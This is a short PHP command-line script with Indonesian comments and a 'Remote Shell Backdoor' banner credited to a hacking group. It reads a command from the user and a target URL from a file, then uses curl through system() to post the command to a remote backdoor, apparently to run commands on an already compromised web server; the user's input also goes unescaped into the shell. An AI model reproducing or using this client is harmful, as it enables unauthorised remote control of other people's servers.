<?php
//Terima kasih sudah menggunakan tools ini, tolong untuk tidak mengganti copyright!
//Coded by Naufal Ardhani
//Thanks to : Ardhana - IndoXploit
//Free recode, tapi tidak untuk copyright!
$hijau = "\033[32";
$kuning = "\033[36";
$kedip = "\033[5";
$cyan = "\033[36m";
$ungu = "\033[95m";
$merah = "\033[91m";

$banner = "$merah
  ____                      _         ____  _          _ _ 
 |  _ \ ___ _ __ ___   ___ | |_ ___  / ___|| |__   ___| | |
 | |_) / _ \ '_ ` _ \ / _ \| __/ _ \ \___ \| '_ \ / _ \ | |
 |  _ <  __/ | | | | | (_) | ||  __/  ___) | | | |  __/ | |
 |_| \_\___|_| |_| |_|\___/ \__\___| |____/|_| |_|\___|_|_|
        | __ )  __ _  ___| | ____| | ___   ___  _ __       
        |  _ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|      
        | |_) | (_| | (__|   < (_| | (_) | (_) | |         
        |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|         
                                                           
        
 
 $cyan
 Team       : Garuda Tersakti 72
 Name       : Remote Access Shell
 Version    : 1.0
 Website    : http://garudatersakti72.id
                                              \n\n";

echo $banner;
echo " Command : ";
$cmd = trim(fgets(STDIN, 1024));


$data = file_get_contents("url.txt");

system("curl $data -d  key='$cmd'");

?>
